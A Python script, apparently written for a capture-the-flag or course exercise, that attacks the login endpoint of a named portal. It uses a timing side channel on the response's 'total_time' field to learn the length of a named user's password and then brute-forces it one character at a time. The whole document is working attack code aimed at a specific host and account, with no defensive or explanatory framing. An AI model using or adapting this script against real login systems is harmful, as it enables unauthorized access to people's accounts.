import requests
import string

def password_length(url, username):
    length = 0
    while True:
        data = '{"username": "' + username + '", "password": "' + 'x' * length + '"}'
        response = requests.post(url, data=data)
        elapsed_time = response.json().get("total_time", 0)

        if elapsed_time > 0:
            return length, elapsed_time

        length += 1

def guess_password(url, username, password_length):
    password = 'x' * password_length
    for i in range(password_length):
        for char in string.printable:  # These are the ASCII printable characters
            password_attempt = list(password)
            password_attempt[i] = char
            password_attempt = ''.join(password_attempt)

            data = {"username": username, "password": password_attempt}
            response = requests.post(url, json=data)

            try:
                elapsed_time = response.json().get("total_time", 0) - 1
            except (ValueError, TypeError):
                elapsed_time = 0

            print(f"Attempting password: {password_attempt}, Time: {elapsed_time + 1}, Status Code: {response.status_code}, Content: {response.content}")

            if elapsed_time > i:
                password = password_attempt
                break

    return password

url = "https://portal.regjeringen.uiaikt.no/login"
username = "jonas.dahl"

print(string.printable)

password_length, time = password_length(url, username)
print("Password length:", password_length)

correct_password = guess_password(url, username, password_length)
print("Password is:", correct_password)
